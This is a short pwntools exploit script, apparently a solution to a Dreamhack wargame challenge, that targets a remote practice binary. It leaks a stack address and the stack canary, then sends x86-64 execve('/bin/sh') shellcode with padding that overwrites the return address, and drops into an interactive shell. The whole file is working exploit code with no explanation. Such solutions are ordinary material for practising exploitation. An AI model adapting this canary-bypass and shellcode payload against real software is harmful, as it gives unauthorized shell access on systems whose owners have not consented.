from pwn import *
p = remote("host1.dreamhack.games", 23689)

payload = b'A'*89
p.recvuntil(b"buf: ")
buf = int(p.recvline().strip(), 16)
print(hex(buf))

shellcode = b'\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05'

p.sendafter("Input: ", payload)
p.recvuntil(payload)

canary = u64(b'\x00' + p.recv(7))
print(hex(canary))

payload2 = shellcode.ljust(88, b'A')  + p64(canary)*2 + p64(buf)
p.recvuntil(b'the return address')
p.sendafter(b"Input: ",payload2)
p.interactive()